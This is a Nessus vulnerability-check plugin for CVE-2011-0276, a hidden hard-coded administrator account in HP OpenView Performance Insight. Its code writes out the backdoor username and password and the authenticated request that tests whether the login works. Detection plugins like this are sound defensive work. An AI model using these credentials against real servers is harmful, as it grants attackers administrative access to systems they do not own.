#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(51850);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2014/08/09 00:11:22 $");

  script_cve_id("CVE-2011-0276");
  script_bugtraq_id(46079);
  script_osvdb_id(70754);
  script_xref(name:"EDB-ID", value:"16984");
  script_xref(name:"Secunia", value:"43145");

  script_name(english:"HP OpenView Performance Insight Server Backdoor Account");
  script_summary(english:"Tries to login to the hidden hch908v account");

  script_set_attribute(
    attribute:"synopsis",
    value:
"It is possible to log on the remote web application by using a hidden
account."
  );
  script_set_attribute(
    attribute:"description",
    value:
"Nessus was able to log into the remote HP OpenView Performance Insight
system using a hidden account. The 'hch908v' user, hard-coded in the
'com.trinagy.security.XMLUserManager' class, is hidden and has
administrative privileges.

A remote attacker could exploit this by logging in as the hidden user
and gain administrative access to the Performance Insight
installation.

After gaining administrative access to the web application, escalation
of privileges may be possible. Nessus has not checked for that issue."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-11-034/");
  # http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02695453
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.nessus.org/u?ad278cb7"
  );
  script_set_attribute(attribute:"solution", value:"Apply the hotfix referenced in the HP advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'HP OpenView Performance Insight Server Backdoor Account Code Execution');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/01/31");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/01/31");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/02/02");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:openview_performance_insight");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2014 Tenable Network Security, Inc.");

  script_dependencies("hp_openview_perf_insight_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/hp_ovpi");

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


port = get_http_port(default:80);
install = get_install_from_kb(appname:'hp_ovpi', port:port, exit_on_fail:TRUE);

user = 'hch908v';
pass = 'z6t0j$+i';
url = install['dir'] + '/reports/home?context=home&type=header';
res = http_send_recv3(
  method:'GET',
  item:url,
  port:port,
  username:user,
  password:pass,
  exit_on_fail:TRUE
);

if ('Log off ' + user + '</a>' >< res[2])
{
  if (report_verbosity > 0)
  {
    header = 'Nessus accessed the following URL as the hidden user';
    trailer =
      '  Username : ' + user + '\n' +
      '  Password : ' + pass;
    report = get_vuln_report(items:url, port:port, header:header, trailer:trailer);
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
else
{
  base_url = build_url(qs:install['dir'], port:port);
  exit(0, 'The HP OVPI install at ' + base_url + ' is not affected.');
}
